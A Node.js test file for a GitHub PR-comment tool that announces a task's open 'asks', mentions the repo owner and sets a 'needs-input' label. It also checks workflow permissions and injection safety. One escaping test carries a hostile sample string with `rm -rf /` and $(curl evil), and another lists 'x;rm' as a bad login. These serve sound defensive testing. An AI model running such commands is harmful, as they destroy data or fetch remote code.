// asks-comment.test.mjs — node --test. The proving tests for flow-0120: a PR whose task has open
// asks gets one comment that @-mentions the repo owner, and the `needs-input` label.
//
// The pure renderer and planner are tested directly. The workflow half (`_flow-status.yml` and
// its two callers) is tested by TEXT SCANNING, with no YAML dependency, and only in canonical:
// this file is copied into every adopting repo, which has no `_flow-status.yml` to read, so those
// tests skip there with the reason printed, as `flow-review.test.mjs` does.
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

import {
  MARKER_PREFIX, NEEDS_INPUT_LABEL, TRUSTED_AUTHORS, announcedIds, findTaskHead, frontmatterId,
  literal, mentionable, orderAsks, planAsks, readComments, renderAsksComment, runCli,
} from "./asks-comment.mjs";
import { parseAsks } from "./asks.mjs";

const BIN = dirname(fileURLToPath(import.meta.url));
const CLI = join(BIN, "asks-comment.mjs");
const CANON_ROOT = resolve(BIN, "..", "..", "..");
const inCanonical = resolve(CANON_ROOT, "project-template", ".flow", "bin") === resolve(BIN);
const canonOnly = { skip: inCanonical ? false : "not canonical: no _flow-status.yml here" };

const BOT = TRUSTED_AUTHORS[0];
const DECISION = "decision: v2 or v3 in the schema id? Recommend: v3, the id should say the shape";
const FOLLOW_UP = "follow-up: the retry path needs its own task";
const FYI = "fyi: the fixture store moved";

/** A task's frontmatter with these asks, as YAML block-list lines. */
function head(asks, id = "flow-0999") {
  const list = asks.length ? "asks:\n" + asks.map((a) => `  - ${JSON.stringify(a)}`).join("\n") : "asks: []";
  return `id: "${id}"\ntitle: "x"\nstatus: "in_progress"\n${list}\nnotes: []`;
}

/** Undo the renderer's escaping: what a reader sees once GitHub has rendered the Markdown. */
function shown(s) {
  return s.replace(/\\([!-/:-@[-`{-~])/g, "$1").replace(/​/g, "");
}

// ── criterion 1: decision, follow-up and fyi → one comment, mention first, decision first ──

test("criterion 1: a task with a decision, a follow-up and an fyi gets one comment that starts with the owner mention and lists the decision first with its recommendation", () => {
  const plan = planAsks({ head: head([FYI, FOLLOW_UP, DECISION]), comments: [], owner: "CandidDan" });
  assert.equal(plan.hasAsks, true, "hasAsks decides the needs-input label");
  assert.ok(plan.body, "a comment must be posted");
  const lines = plan.body.split("\n");
  assert.equal(lines[0], "@CandidDan this PR needs you:", "the comment must start with the mention");
  const d = plan.body.indexOf("**Decision**"), f = plan.body.indexOf("**Follow-up**"), y = plan.body.indexOf("**FYI**");
  assert.ok(d > 0 && d < f && f < y, "decision, then follow-up, then fyi, whatever the task's order");
  assert.match(plan.body, /\*\*Decision\*\* — v2 or v3 in the schema id\?\n↳ Recommend: v3, the id should say the shape\n/);
  assert.equal(plan.newIds.length, 3);
  assert.ok(plan.body.trimEnd().endsWith(`${MARKER_PREFIX}${plan.newIds.join(",")} -->`),
    "the hidden marker records exactly the ids this comment announced");
});

test("criterion 1: the CLI reports has_asks and post, and writes the body only to the file named", () => {
  const dir = mkdtempSync(join(tmpdir(), "asks-comment-"));
  mkdirSync(join(dir, "tasks"));
  writeFileSync(join(dir, "tasks", "flow-0999-x.md"), `---\n${head([DECISION, FYI])}\n---\n\nBody.\n`);
  const body = join(dir, "body.md");
  const r = spawnSync(process.execPath, [CLI, "plan", "--tasks-dir", join(dir, "tasks"), "--id", "flow-0999",
    "--owner", "CandidDan", "--comments", join(dir, "none.jsonl"), "--body-out", body], { encoding: "utf8" });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /^has_asks=true$/m);
  assert.match(r.stdout, /^post=true$/m);
  assert.match(r.stdout, /^errors=0$/m);
  assert.ok(readFileSync(body, "utf8").startsWith("@CandidDan this PR needs you:"));
});

// ── criterion 2: reopened with the same asks → no second comment ──

test("criterion 2: when a trusted earlier comment announced every ask, nothing is posted, and the label stays", () => {
  const first = planAsks({ head: head([DECISION, FOLLOW_UP, FYI]), comments: [], owner: "CandidDan" });
  const again = planAsks({ head: head([DECISION, FOLLOW_UP, FYI]),
    comments: [{ body: "unrelated", user: "someone" }, { body: first.body, user: BOT }], owner: "CandidDan" });
  assert.equal(again.body, null, "an ask already announced on this PR is never posted again");
  assert.deepEqual(again.newIds, []);
  assert.equal(again.hasAsks, true, "the task still has asks, so needs-input stays on the PR");
});

test("criterion 2: a marker in a comment by anyone but the workflow's bot is ignored", () => {
  const first = planAsks({ head: head([DECISION]), comments: [], owner: "CandidDan" });
  const planted = planAsks({ head: head([DECISION]), comments: [{ body: first.body, user: "outsider" }], owner: "CandidDan" });
  assert.ok(planted.body, "anyone who can comment must not be able to silence an ask");
  assert.equal(announcedIds([{ body: first.body, user: "outsider" }]).size, 0);
});

// ── criterion 3: a new ask → one new comment with only the new ask, mention first ──

test("criterion 3: an ask added after the first announcement gets one new comment carrying only that ask", () => {
  const first = planAsks({ head: head([DECISION]), comments: [], owner: "CandidDan" });
  const later = planAsks({ head: head([DECISION, FOLLOW_UP]), comments: [{ body: first.body, user: BOT }], owner: "CandidDan" });
  assert.ok(later.body);
  assert.ok(later.body.startsWith("@CandidDan this PR needs you:\n"), "a new comment, again starting with the mention");
  assert.match(later.body, /\*\*Follow-up\*\* — the retry path needs its own task/);
  assert.doesNotMatch(later.body, /Decision/, "the decision was already announced");
  assert.deepEqual(later.newIds, parseAsks([FOLLOW_UP]).asks.map((a) => a.id));
});

// ── criterion 4: no asks → no comment, and the label comes off ──

test("criterion 4: a task with no asks posts nothing and reports has_asks=false, so needs-input is removed", () => {
  for (const h of [head([]), "id: \"flow-0999\"\nstatus: \"in_review\""]) {
    const plan = planAsks({ head: h, comments: [], owner: "CandidDan" });
    assert.equal(plan.hasAsks, false);
    assert.equal(plan.body, null);
  }
  const dir = mkdtempSync(join(tmpdir(), "asks-comment-"));
  writeFileSync(join(dir, "flow-0999-x.md"), `---\n${head([])}\n---\n`);
  const lines = [];
  const code = runCli(["plan", "--tasks-dir", dir, "--id", "flow-0999", "--owner", "o", "--body-out", join(dir, "b.md")],
    { out: { write: (s) => lines.push(s) }, err: { write: () => {} } });
  assert.equal(code, 0);
  assert.match(lines.join(""), /^has_asks=false$/m);
  assert.match(lines.join(""), /^post=false$/m);
  assert.equal(existsSync(join(dir, "b.md")), false, "no body file when there is nothing to post");
});

// ── criterion 5: hostile text shows literally ──

test("criterion 5: ask text with $(...), backticks and a newline shows literally and cannot mention anyone or forge a marker", () => {
  const text = "run `rm -rf /` or $(curl evil) *now*\nthen ping @someone <!-- flow-asks: zzz -->";
  const [ask] = parseAsks([`fyi: ${text}`]).asks;
  const body = renderAsksComment({ owner: "CandidDan", asks: [ask] });
  const line = body.split("\n").slice(2, 4).join("\n").replace(/^\*\*FYI\*\* — /, "");
  assert.equal(shown(line), text, "once rendered, the reader sees exactly the text in the task");
  assert.doesNotMatch(line, /(^|[^\\])[`$*<>]/, "every Markdown-active character is escaped");
  assert.doesNotMatch(line, /@someone/, "ask text can never mention anyone");
  assert.equal((body.match(/<!-- flow-asks: /g) || []).length, 1, "only the real marker is a marker");
  assert.equal(announcedIds([{ body, user: BOT }]).has("zzz"), false);
  assert.equal(literal("a\n\n\nb"), "a\nb", "blank lines collapse so the ask stays one block");
});

test("criterion 5: the owner line only ever carries a valid GitHub login", () => {
  assert.equal(mentionable("CandidDan"), "CandidDan");
  for (const bad of ["", "a b", "x;rm", "-lead", "@x"]) assert.equal(mentionable(bad), "", bad);
  assert.ok(renderAsksComment({ owner: "a b", asks: parseAsks([FYI]).asks }).startsWith("This PR needs you:"));
});

// ── supporting: lookup and parsing ──

test("the task is found by its frontmatter id, never by file name, and a missing task is a clean no-op", () => {
  const dir = mkdtempSync(join(tmpdir(), "asks-comment-"));
  writeFileSync(join(dir, "renamed.md"), `---\n${head([FYI], "flow-0042")}\n---\n`);
  writeFileSync(join(dir, "_TEMPLATE.md"), `---\nid: "flow-0042"\nasks: ["fyi: template"]\n---\n`);
  writeFileSync(join(dir, "notes.txt"), "id: flow-0042");
  assert.equal(frontmatterId(findTaskHead(dir, "FLOW-0042")), "flow-0042");
  assert.match(findTaskHead(dir, "flow-0042"), /fixture store/);
  assert.equal(findTaskHead(dir, "flow-0043"), null);
  assert.equal(findTaskHead(join(dir, "absent"), "flow-0042"), null);
  const out = [], err = [];
  assert.equal(runCli(["plan", "--tasks-dir", dir, "--id", "flow-0043", "--body-out", join(dir, "b")],
    { out: { write: (s) => out.push(s) }, err: { write: (s) => err.push(s) } }), 0);
  assert.match(out.join(""), /^post=false$/m);
  assert.match(err.join(""), /no task with id flow-0043/);
});

test("a malformed ask is counted, not announced; JSON Lines comments tolerate junk; bad usage exits 2", () => {
  const plan = planAsks({ head: head([FYI, "decision: no recommendation here"]), comments: [], owner: "o" });
  assert.equal(plan.errors, 1);
  assert.equal(plan.newIds.length, 1);
  assert.deepEqual(readComments(`{"body":"a","user":"b"}\n\nnot json\n42\n{"body":7}\n`),
    [{ body: "a", user: "b" }, { body: "7", user: "" }]);
  const sink = { write: () => {} };
  assert.equal(runCli([], { out: sink, err: sink }), 2);
  assert.equal(runCli(["plan", "--id", "x"], { out: sink, err: sink }), 2);
  assert.deepEqual(orderAsks(undefined), []);
  assert.equal(NEEDS_INPUT_LABEL, "needs-input");
});

// ── the workflow half (canonical only) ──

const WF = join(CANON_ROOT, ".github", "workflows");
const read = (p) => readFileSync(p, "utf8");

/** The text of one top-level job: from `  <id>:` to the next two-space key or the end. */
function job(text, id) {
  const lines = text.split("\n");
  const start = lines.findIndex((l) => l === `  ${id}:`);
  assert.notEqual(start, -1, `no job ${id}`);
  let end = lines.length;
  for (let i = start + 1; i < lines.length; i++) if (/^  [A-Za-z_][\w-]*:/.test(lines[i])) { end = i; break; }
  return lines.slice(start, end).join("\n");
}

/** The `permissions:` block directly under a job (four-space keys), as a map, or null. */
function jobPermissions(jobText) {
  const lines = jobText.split("\n");
  const i = lines.findIndex((l) => l === "    permissions:");
  if (i === -1) return null;
  const out = {};
  for (let j = i + 1; j < lines.length; j++) {
    const m = lines[j].match(/^      ([a-z-]+):\s*([a-z-]+)/);
    if (!m) break;
    out[m[1]] = m[2];
  }
  return out;
}

const FETCH_NAME = "      - name: Materialise canonical's helpers at this workflow's commit\n";
const FETCH_END = 'echo "FLOW_BIN=$bin" >> "$GITHUB_ENV"';
function fetchStep(source) {
  const i = source.indexOf(FETCH_NAME);
  assert.notEqual(i, -1, "no materialise step");
  return source.slice(i, source.indexOf(FETCH_END, i) + FETCH_END.length);
}

test("criterion 6: the reusable has no top-level permissions; sync-status keeps contents: write; the asks job inherits", canonOnly, () => {
  const text = read(join(WF, "_flow-status.yml"));
  assert.doesNotMatch(text, /^permissions:/m,
    "a top-level block caps every job at it, so the asks job could never use the caller's grant");
  assert.deepEqual(jobPermissions(job(text, "sync-status")), { "contents": "write" },
    "sync-status keeps exactly what the file granted before");
  assert.equal(jobPermissions(job(text, "asks")), null,
    "requesting pull-requests or issues here would fail the whole run in a repo whose caller is not synced");
});

test("criterion 6: both flow-status callers grant exactly contents, pull-requests and issues write, at job scope", canonOnly, () => {
  for (const p of [join(WF, "flow-status.yml"), join(CANON_ROOT, "project-template", ".github", "workflows", "flow-status.yml")]) {
    const text = read(p);
    assert.doesNotMatch(text, /^permissions:/m, `${p}: no top-level grant`);
    assert.deepEqual(jobPermissions(job(text, "flow-status")),
      { "contents": "write", "pull-requests": "write", "issues": "write" }, p);
  }
});

test("criterion 5: the workflow passes the comment body by file and never interpolates ask text into a run: line", canonOnly, () => {
  const asks = job(read(join(WF, "_flow-status.yml")), "asks");
  assert.match(asks, /-F "body=@\$body"/, "the body reaches GitHub from a file");
  assert.match(asks, /--body-out "\$body"/, "the renderer writes it to that file");
  for (const line of asks.split("\n").filter((l) => l.includes("${{"))) {
    assert.match(line, /^\s+(?:[A-Z_]+:\s+|runs-on: |FLOW_[A-Z_]+: |if: )|github\.event\.action/,
      `an expression may only feed env:, runs-on or if:, never a run: line — ${line.trim()}`);
  }
});

test("criteria 1 and 4: the workflow adds needs-input when the task has asks and removes it when it has none", canonOnly, () => {
  const asks = job(read(join(WF, "_flow-status.yml")), "asks");
  assert.match(asks, /if \[ "\$has_asks" = "true" \]; then[\s\S]*labels\[\]=needs-input[\s\S]*else[\s\S]*-X DELETE "repos\/\$REPO\/issues\/\$PR_NUM\/labels\/needs-input"/);
  assert.match(asks, /if \[ "\$post" = "true" \]; then\n\s+if gh api -X POST "repos\/\$REPO\/issues\/\$PR_NUM\/comments"/);
  assert.match(asks, /github\.event\.action == 'opened' \|\| github\.event\.action == 'reopened' \|\|\n\s+github\.event\.action == 'ready_for_review'/,
    "the job runs on opened, reopened and ready_for_review only");
  assert.match(asks, /--owner "\$REPO_OWNER"/);
  assert.match(asks, /REPO_OWNER: \$\{\{ github\.repository_owner \}\}/, "the mention target is the repository owner");
});

test("the asks job fetches canonical's helpers exactly as the gate does, differing only in the helper list", canonOnly, () => {
  const forLine = /^ *for helper in .*$/m;
  const mine = fetchStep(job(read(join(WF, "_flow-status.yml")), "asks"));
  const theirs = fetchStep(read(join(WF, "_flow-gates.yml")));
  assert.match(mine, /for helper in asks-comment\.mjs asks\.mjs flow-doctor\.mjs; do/);
  assert.equal(mine.replace(forLine, "HELPERS"), theirs.replace(forLine, "HELPERS"),
    "re-copy the step from _flow-gates.yml rather than hand-editing it");
  assert.match(read(join(WF, "_flow-status.yml")), /flow_ref:\n[\s\S]*?default: ""/,
    "the GHES fallback the fetch step reads must be a declared input that defaults to empty");
});
